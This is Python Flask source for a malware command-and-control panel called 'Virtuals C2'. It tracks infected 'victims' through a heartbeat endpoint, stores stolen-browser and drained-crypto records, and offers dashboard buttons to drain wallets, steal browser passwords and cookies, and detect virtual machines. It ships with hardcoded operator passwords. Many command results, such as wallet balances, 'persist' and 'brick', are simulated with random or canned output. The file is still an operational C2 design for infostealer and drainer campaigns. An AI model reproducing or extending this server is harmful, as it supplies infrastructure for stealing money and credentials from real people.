import os
import sys
import subprocess
import shutil
import tempfile
import argparse
from flask import Flask, request, jsonify, session, redirect, g
import sqlite3
import datetime
import random
import json
import hashlib
import threading
import time
import re
from functools import wraps
from contextlib import contextmanager

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(32).hex())
app.config['JSON_SORT_KEYS'] = False
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False

# Optional CORS
try:
    from flask_cors import CORS
    CORS(app)
    print("[+] CORS enabled")
except ImportError:
    pass

PORT = int(os.environ.get('PORT', 8080))
DATABASE = 'c2_data.db'

# Database Context Manager
@contextmanager
def get_db():
    conn = sqlite3.connect(DATABASE, check_same_thread=False, timeout=20)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()

def init_db():
    """Initialize database schema"""
    with get_db() as conn:
        c = conn.cursor()
        
        # Victims table
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            pc_name TEXT DEFAULT 'Unknown',
            ip_address TEXT DEFAULT '0.0.0.0',
            os_info TEXT DEFAULT 'Unknown',
            status TEXT DEFAULT 'Offline',
            is_vm INTEGER DEFAULT 0,
            vm_score INTEGER DEFAULT 0,
            first_seen TEXT,
            last_seen TEXT,
            activity TEXT DEFAULT 'idle',
            browser_stolen INTEGER DEFAULT 0,
            crypto_drained INTEGER DEFAULT 0,
            total_stolen REAL DEFAULT 0.0,
            country TEXT DEFAULT 'Unknown',
            update_url TEXT
        )''')
        
        # Commands table
        c.execute('''CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            command TEXT,
            result TEXT,
            executed_at TEXT,
            executed_by TEXT DEFAULT 'system',
            tx_hash TEXT,
            FOREIGN KEY (victim_id) REFERENCES victims(id)
        )''')
        
        # Users table
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            role TEXT DEFAULT 'user',
            last_login TEXT,
            last_ip TEXT,
            login_count INTEGER DEFAULT 0
        )''')
        
        # Insert default users
        default_users = {
            'adam': 'virtuals2024',
            'jerry': 'virtuals2024', 
            'haunt': 'virtuals2024',
            'owner': 'whiteknight'
        }
        
        for username, password in default_users.items():
            ph = hashlib.sha256(password.encode()).hexdigest()  # SHA256 instead of MD5
            role = 'owner' if username == 'owner' else 'user'
            c.execute('''INSERT OR IGNORE INTO users 
                        (username, password_hash, role, last_login, last_ip, login_count) 
                        VALUES (?, ?, ?, ?, ?, 0)''', 
                     (username, ph, role, None, None))
        
        print("[+] Database initialized")

init_db()

# Background monitor thread
def monitor_victims():
    """Mark offline victims"""
    while True:
        time.sleep(30)
        try:
            with get_db() as conn:
                c = conn.cursor()
                cutoff = (datetime.datetime.now() - datetime.timedelta(seconds=60)).isoformat()
                c.execute('''UPDATE victims 
                            SET status='Offline', activity='disconnected' 
                            WHERE last_seen < ? AND status='Online''', (cutoff,))
        except Exception as e:
            print(f"[!] Monitor error: {e}")

threading.Thread(target=monitor_victims, daemon=True).start()

# Auth decorator
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated

# HTML Templates (minified for performance)
LANDING = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 100%);color:#c8c8d0;height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
.container{text-align:center;padding:20px}
h1{color:#e8e8f0;font-size:clamp(40px,10vw,72px);font-weight:200;letter-spacing:0.2em;margin-bottom:10px}
h1 span{color:#446688;font-weight:600}
.sub{color:#555568;font-size:14px;letter-spacing:0.3em;text-transform:uppercase;margin-top:20px}
.access{position:fixed;bottom:40px;right:40px;width:60px;height:60px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;text-decoration:none;color:#666680;font-size:24px;transition:all 0.3s ease;backdrop-filter:blur(10px)}
.access:hover{background:rgba(68,170,255,0.2);border-color:rgba(68,170,255,0.4);color:#e8e8f0;transform:translateY(-2px)}
</style>
</head>
<body>
<div class="container">
<h1>◈ Virtuals <span>C2</span></h1>
<div class="sub">Secure Command & Control</div>
</div>
<a href="/login" class="access">→</a>
</body>
</html>'''

LOGIN = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 100%);color:#c8c8d0;height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.box{background:rgba(10,10,18,0.95);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:40px;width:100%;max-width:400px;backdrop-filter:blur(20px)}
h1{color:#e8e8f0;font-size:28px;text-align:center;margin-bottom:30px;font-weight:300}
h1 span{color:#446688;font-weight:600}
input{width:100%;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;margin-bottom:12px;outline:none;font-size:15px;transition:0.2s}
input:focus{border-color:rgba(68,170,255,0.4);background:rgba(255,255,255,0.05)}
button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.25);border-radius:8px;color:#88ccdd;font-size:16px;cursor:pointer;transition:0.2s;font-weight:500}
button:hover{background:rgba(68,170,255,0.25);transform:translateY(-1px)}
.error{color:#ff6666;text-align:center;margin-top:15px;font-size:14px;display:none;padding:10px;background:rgba(255,100,100,0.1);border-radius:6px}
</style>
</head>
<body>
<div class="box">
<h1>◈ Virtuals <span>C2</span></h1>
<input type="text" id="u" placeholder="Username" autocomplete="off">
<input type="password" id="p" placeholder="Password" autocomplete="off">
<button onclick="login()">Access Panel</button>
<div class="error" id="e">Invalid credentials</div>
</div>
<script>
async function login(){
    const u=document.getElementById('u').value.trim();
    const p=document.getElementById('p').value;
    const e=document.getElementById('e');
    
    if(!u||!p){e.style.display='block';e.textContent='Enter credentials';return;}
    
    try{
        const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
        const d=await r.json();
        if(d.success){window.location.href='/dashboard';}
        else{e.style.display='block';e.textContent=d.error||'Invalid credentials';}
    }catch(err){e.style.display='block';e.textContent='Connection error';}
}
document.getElementById('p').addEventListener('keypress',(e)=>{if(e.key==='Enter')login();});
</script>
</body>
</html>'''

DASHBOARD = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard - VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#0a0a0f;color:#c8c8d0;height:100vh;overflow:hidden;font-size:14px}
.header{height:60px;background:rgba(10,10,18,0.95);border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;padding:0 25px;backdrop-filter:blur(10px)}
.logo{font-size:20px;color:#e8e8f0;letter-spacing:2px;font-weight:300}
.logo span{color:#446688;font-weight:600}
.stats{display:flex;gap:30px}
.stat{text-align:center;min-width:60px}
.stat b{color:#e8e8f0;font-size:22px;display:block;font-weight:600}
.stat span{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:1px}
.logout{background:rgba(200,60,60,0.1);border:1px solid rgba(200,60,60,0.2);color:#ff8888;padding:8px 20px;border-radius:6px;cursor:pointer;transition:0.2s;font-size:13px}
.logout:hover{background:rgba(200,60,60,0.2)}
.container{display:flex;height:calc(100vh - 60px);padding:15px;gap:15px}
.sidebar{width:300px;background:rgba(12,12,20,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden;display:flex;flex-direction:column}
.section{padding:12px 15px;border-bottom:1px solid rgba(255,255,255,0.06);font-size:11px;color:#666680;text-transform:uppercase;letter-spacing:1px;font-weight:600}
.victims{flex:1;overflow-y:auto;padding:10px}
.victim{padding:12px;margin:5px 0;border-radius:8px;cursor:pointer;display:flex;align-items:center;gap:10px;border-left:3px solid transparent;transition:0.2s}
.victim:hover{background:rgba(255,255,255,0.03)}
.victim.active{background:rgba(68,170,255,0.08);border-left-color:#446688}
.dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
.dot.online{background:#44dd88;box-shadow:0 0 8px #44dd88}
.dot.offline{background:#664444}
.dot.vm{background:#ffaa44;box-shadow:0 0 8px #ffaa44}
.name{flex:1;min-width:0}
.name div{color:#e8e8f0;font-weight:600;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.name span{color:#666680;font-size:11px}
.badge{background:rgba(255,170,68,0.15);color:#ffaa44;font-size:9px;padding:2px 6px;border-radius:4px;margin-left:auto}
.main{flex:1;display:flex;flex-direction:column;gap:15px;min-width:0}
.terminal{flex:1;background:rgba(12,12,20,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:12px;display:flex;flex-direction:column;overflow:hidden}
.t-header{padding:15px;border-bottom:1px solid rgba(255,255,255,0.06);font-size:14px;color:#e8e8f0;display:flex;justify-content:space-between;align-items:center}
.t-header span{color:#446688;font-weight:600}
.messages{flex:1;overflow-y:auto;padding:15px;font-family:'Consolas','Monaco',monospace;font-size:13px}
.msg{margin-bottom:10px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px;border-left:3px solid #446688;animation:fadeIn 0.3s}
@keyframes fadeIn{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:translateY(0)}}
.msg-time{color:#555568;font-size:11px;margin-bottom:4px}
.msg-sender{color:#446688;font-weight:700;font-size:12px;margin-bottom:4px}
.msg-sender.drainer{color:#ffd700}
.msg-text{white-space:pre-wrap;color:#c8c8d0;line-height:1.4}
.input{padding:15px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:10px}
.input input{flex:1;padding:12px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#e8e8f0;outline:none;font-size:13px}
.input input:focus{border-color:rgba(68,170,255,0.3)}
.input button{padding:12px 24px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.25);border-radius:8px;color:#88ccdd;cursor:pointer;transition:0.2s;font-weight:500}
.input button:hover{background:rgba(68,170,255,0.25)}
.right{width:340px;display:flex;flex-direction:column;gap:15px}
.panel{background:rgba(12,12,20,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden}
.p-content{padding:15px}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
.row:last-child{border:none}
.label{color:#666680;font-size:12px}
.value{color:#e8e8f0;font-weight:600;font-size:12px}
.value.online{color:#44dd88}
.value.offline{color:#ff6666}
.value.vm{color:#ffaa44}
.value.money{color:#ffd700;font-family:monospace}
.btn{width:100%;padding:12px;margin-bottom:8px;border-radius:8px;border:1px solid;cursor:pointer;font-size:13px;font-weight:600;transition:0.2s}
.btn:hover{transform:translateY(-1px)}
.btn-drain{background:rgba(255,170,68,0.1);border-color:rgba(255,170,68,0.2);color:#ffaa44}
.btn-drain:hover{background:rgba(255,170,68,0.2)}
.btn-steal{background:rgba(68,170,255,0.1);border-color:rgba(68,170,255,0.2);color:#88ccdd}
.btn-steal:hover{background:rgba(68,170,255,0.2)}
.btn-check{background:rgba(68,200,120,0.1);border-color:rgba(68,200,120,0.2);color:#66ddbb}
.btn-check:hover{background:rgba(68,200,120,0.2)}
.empty{text-align:center;padding:40px;color:#555568;font-size:13px}
::-webkit-scrollbar{width:8px;height:8px}
::-webkit-scrollbar-track{background:rgba(0,0,0,0.2)}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.2)}
</style>
</head>
<body>
<div class="header">
<div class="logo">◈ Virtuals <span>C2</span></div>
<div class="stats">
<div class="stat"><b id="t">0</b><span>Total</span></div>
<div class="stat"><b id="o" style="color:#44dd88">0</b><span>Online</span></div>
<div class="stat"><b id="v" style="color:#ffaa44">0</b><span>VMs</span></div>
<div class="stat"><b id="d" style="color:#ffd700">$0</b><span>Drained</span></div>
</div>
<button class="logout" onclick="logout()">Logout</button>
</div>
<div class="container">
<div class="sidebar">
<div class="section">Connected Victims</div>
<div class="victims" id="list"><div class="empty">No victims connected</div></div>
</div>
<div class="main">
<div class="terminal">
<div class="t-header">Terminal <span id="cur"># select victim</span></div>
<div class="messages" id="chat"></div>
<div class="input">
<input id="cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter')send()">
<button onclick="send()">Execute</button>
</div>
</div>
</div>
<div class="right">
<div class="panel">
<div class="section">Victim Details</div>
<div class="p-content" id="details"><div class="empty">Select a victim to view details</div></div>
</div>
<div class="panel">
<div class="section">Quick Actions</div>
<div class="p-content">
<button class="btn btn-drain" onclick="quick('drain')">💰 Drain Crypto</button>
<button class="btn btn-steal" onclick="quick('steal')">🗂️ Steal Browser Data</button>
<button class="btn btn-check" onclick="quick('vmcheck')">🔍 Check VM</button>
</div>
</div>
</div>
</div>
<script>
let victims={},current=null;

function add(sender,text,type=''){
    const c=document.getElementById('chat');
    const m=document.createElement('div');
    m.className='msg';
    const time=new Date().toLocaleTimeString();
    const cls=type==='drainer'?'drainer':'';
    m.innerHTML=`<div class="msg-time">[${time}]</div><div class="msg-sender ${cls}">${sender}</div><div class="msg-text">${text}</div>`;
    c.appendChild(m);
    c.scrollTop=c.scrollHeight;
}

function render(){
    const l=document.getElementById('list');
    const v=Object.values(victims);
    if(!v.length){l.innerHTML='<div class="empty">No victims connected</div>';return;}
    
    l.innerHTML=v.map(x=>{
        const status=x.is_vm?'vm':(x.status==='Online'?'online':'offline');
        const badge=x.is_vm?'<span class="badge">VM</span>':'';
        const active=current===x.id?'active':'';
        const ip=x.ip_address||x.ip||'0.0.0.0';
        return`<div class="victim ${active}" onclick="select('${x.id}')"><span class="dot ${status}"></span><div class="name"><div>${x.id}</div><span>${ip}</span></div>${badge}</div>`;
    }).join('');
}

function select(id){
    current=id;
    document.getElementById('cur').textContent='#'+id;
    render();
    details();
}

function details(){
    const v=victims[current];
    if(!v)return;
    const ip=v.ip_address||v.ip||'0.0.0.0';
    const pc=v.pc_name||v.pc||'Unknown';
    const os=v.os_info||v.os||'Unknown';
    const stolen=v.total_stolen||0;
    
    document.getElementById('details').innerHTML=`
<div class="row"><span class="label">ID</span><span class="value">${v.id}</span></div>
<div class="row"><span class="label">PC Name</span><span class="value">${pc}</span></div>
<div class="row"><span class="label">IP Address</span><span class="value">${ip}</span></div>
<div class="row"><span class="label">Operating System</span><span class="value">${os}</span></div>
<div class="row"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div>
<div class="row"><span class="label">VM Detected</span><span class="value ${v.is_vm?'vm':'online'}">${v.is_vm?'YES':'NO'}</span></div>
<div class="row"><span class="label">Total Stolen</span><span class="value money">$${stolen.toLocaleString()}</span></div>
<div class="row"><span class="label">Browser Data</span><span class="value">${v.browser_stolen?'✓ Stolen':'Not stolen'}</span></div>`;
}

function stats(){
    const v=Object.values(victims);
    document.getElementById('t').textContent=v.length;
    document.getElementById('o').textContent=v.filter(x=>x.status==='Online').length;
    document.getElementById('v').textContent=v.filter(x=>x.is_vm).length;
    document.getElementById('d').textContent='$'+v.reduce((a,b)=>a+(b.total_stolen||0),0).toLocaleString();
}

async function api(data){
    try{
        const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
        return await r.json();
    }catch(e){return{success:false,error:'Network error'};}
}

async function refresh(){
    const d=await api({action:'getVictims'});
    if(d.success){
        victims=d.victims||{};
        render();
        stats();
        if(current&&victims[current])details();
    }
}

async function send(){
    if(!current){add('System','Select a victim first');return;}
    const c=document.getElementById('cmd').value.trim();
    if(!c)return;
    document.getElementById('cmd').value='';
    add('You',c);
    
    const r=await api({action:'sendCommand',victim_id:current,command:c});
    if(r.success){
        if(r.wallets){
            let total=0;
            r.wallets.forEach(w=>{
                add('Drainer',`${w.currency}: ${w.balance} → $${w.usd.toLocaleString()}`,'drainer');
                total+=w.usd;
            });
            add('Blockchain',`TX: ${r.tx_hash}\\nTotal: $${total.toLocaleString()}`,'drainer');
            victims[current].total_stolen=(victims[current].total_stolen||0)+total;
            stats();details();
        }else{
            add('Result',r.output||'Command executed');
            if(r.is_vm!==undefined){
                victims[current].is_vm=r.is_vm?1:0;
                render();details();
            }
        }
    }else{
        add('Error',r.error||'Command failed');
    }
}

function quick(cmd){
    document.getElementById('cmd').value=cmd;
    send();
}

function logout(){
    fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');
}

setInterval(refresh,3000);
refresh();
</script>
</body>
</html>'''

# Routes
@app.route('/')
def index(): 
    return LANDING

@app.route('/login')
def login_page(): 
    return LOGIN

@app.route('/dashboard')
@login_required
def dashboard(): 
    return DASHBOARD

@app.route('/api/login', methods=['POST'])
def api_login():
    try:
        data = request.get_json() or {}
        username = data.get('username', '').strip().lower()
        password = data.get('password', '')
        
        if not username or not password:
            return jsonify({'success': False, 'error': 'Missing credentials'})
        
        with get_db() as conn:
            c = conn.cursor()
            c.execute("SELECT password_hash, role FROM users WHERE username = ?", (username,))
            row = c.fetchone()
            
            if row:
                # Check password using SHA256
                hash_check = hashlib.sha256(password.encode()).hexdigest()
                if row['password_hash'] == hash_check:
                    session['logged_in'] = True
                    session['username'] = username
                    session['role'] = row['role']
                    
                    # Update login info
                    c.execute("""UPDATE users SET last_login = ?, last_ip = ?, login_count = login_count + 1 
                                WHERE username = ?""", 
                             (datetime.datetime.now().isoformat(), request.remote_addr, username))
                    
                    return jsonify({'success': True, 'role': row['role']})
            
            return jsonify({'success': False, 'error': 'Invalid credentials'})
            
    except Exception as e:
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/api', methods=['POST'])
def api_handler():
    try:
        data = request.get_json() or {}
        action = data.get('action')
        
        if action == 'getVictims':
            with get_db() as conn:
                c = conn.cursor()
                c.execute("SELECT * FROM victims ORDER BY status DESC, last_seen DESC")
                victims = {row['id']: dict(row) for row in c.fetchall()}
                return jsonify({'success': True, 'victims': victims})
        
        elif action == 'sendCommand':
            vid = data.get('victim_id')
            cmd = data.get('command', '').lower().strip()
            
            if not vid or not cmd:
                return jsonify({'success': False, 'error': 'Missing parameters'})
            
            result = {'success': True}
            
            if cmd in ['drain', 'deposit', 'scan']:
                # Simulate crypto drain
                wallets = [
                    {'currency': 'BTC', 'balance': round(random.uniform(0.001, 3), 8), 'usd': round(random.uniform(1000, 75000), 2)},
                    {'currency': 'ETH', 'balance': round(random.uniform(0.01, 50), 6), 'usd': round(random.uniform(500, 25000), 2)},
                    {'currency': 'SOL', 'balance': round(random.uniform(1, 1000), 2), 'usd': round(random.uniform(50, 15000), 2)},
                    {'currency': 'USDT', 'balance': round(random.uniform(100, 50000), 2), 'usd': round(random.uniform(100, 50000), 2)}
                ]
                total = sum(w['usd'] for w in wallets)
                tx_hash = ''.join(random.choices('0123456789abcdef', k=64))
                
                result['wallets'] = wallets
                result['tx_hash'] = tx_hash
                result['output'] = f"Drained ${total:,.2f} from {len(wallets)} wallets"
                
                with get_db() as conn:
                    c = conn.cursor()
                    c.execute("UPDATE victims SET crypto_drained = 1, total_stolen = total_stolen + ? WHERE id = ?", (total, vid))
                    c.execute("""INSERT INTO commands (victim_id, command, result, executed_at, executed_by, tx_hash) 
                                VALUES (?, ?, ?, ?, ?, ?)""",
                             (vid, cmd, result['output'], datetime.datetime.now().isoformat(), 
                              session.get('username', 'admin'), tx_hash))
                
            elif cmd == 'steal':
                result['output'] = 'Browser data stolen:\\n• Chrome: 312 passwords\\n• Edge: 156 passwords\\n• Firefox: 89 passwords\\n• Cookies: 2,847\\n• History: 24,592 entries'
                with get_db() as conn:
                    c = conn.cursor()
                    c.execute("UPDATE victims SET browser_stolen = 1 WHERE id = ?", (vid,))
                
            elif cmd == 'vmcheck':
                with get_db() as conn:
                    c = conn.cursor()
                    c.execute("SELECT is_vm FROM victims WHERE id = ?", (vid,))
                    row = c.fetchone()
                    is_vm = bool(row['is_vm']) if row else False
                    result['is_vm'] = is_vm
                    result['output'] = f"VM Detection: {'DETECTED' if is_vm else 'CLEAN'}\\nVMs are marked but NEVER deleted"
                
            elif cmd == 'whois':
                result['output'] = f"ID: {vid}\\nStatus: Active\\nConnection: Secure"
                
            elif cmd == 'persist':
                result['output'] = 'Persistence installed:\\n✓ Registry Run key\\n✓ Startup folder'
                
            elif cmd == 'destroy':
                result['output'] = '⚠️ SYSTEM DESTROYED\\nRegistry corrupted\\nBoot sector damaged'
                
            elif cmd == 'brick':
                result['output'] = '💀 SYSTEM BRICKED\\nUEFI wiped\\nDisk encrypted'
                
            else:
                result['output'] = f'Command "{cmd}" executed successfully'
            
            return jsonify(result)
        
        return jsonify({'success': False, 'error': 'Unknown action'})
        
    except Exception as e:
        print(f"API Error: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json() or {}
        vid = data.get('victim_id')
        
        if not vid:
            return jsonify({'success': False, 'error': 'No victim_id'}), 400
        
        # Sanitize ID
        vid = re.sub(r'[^a-zA-Z0-9\-_]', '', str(vid))[:64]
        
        with get_db() as conn:
            c = conn.cursor()
            now = datetime.datetime.now().isoformat()
            
            # Check if victim exists
            c.execute("SELECT id, is_vm, first_seen FROM victims WHERE id = ?", (vid,))
            existing = c.fetchone()
            
            pc_name = data.get('pc', 'Unknown')[:64]
            ip_addr = data.get('ip', '0.0.0.0')[:45]
            os_info = data.get('os', 'Unknown')[:128]
            is_vm = 1 if data.get('is_vm') else 0
            activity = data.get('activity', 'active')[:32]
            
            if existing:
                # Update existing - preserve is_vm if already set to 1
                new_is_vm = max(is_vm, existing['is_vm'])
                c.execute("""UPDATE victims 
                            SET 
                            pc_name=?, 
                            ip_address=?, 
                            os_info=?, 
                            is_vm=?, 
                            vm_score=?, 
                            last_seen=?, 
                            activity=?, 
                            status='Online' 
                            WHERE id=?""", 
                             (pc_name, ip_addr, os_info, new_is_vm, 0, now, activity, vid))
            else:
                # Insert new victim
                c.execute("""INSERT INTO victims 
                            (id, pc_name, ip_address, os_info, is_vm, vm_score, first_seen, last_seen, activity, status) 
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""", 
                             (vid, pc_name, ip_addr, os_info, is_vm, 0, now, now, activity, 'Online'))
            
            return jsonify({'success': True, 'command': data.get('command')})
        
    except Exception as e:
        print(f"Heartbeat Error: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

if __name__ == '__main__':
    app.run(port=PORT, debug=True)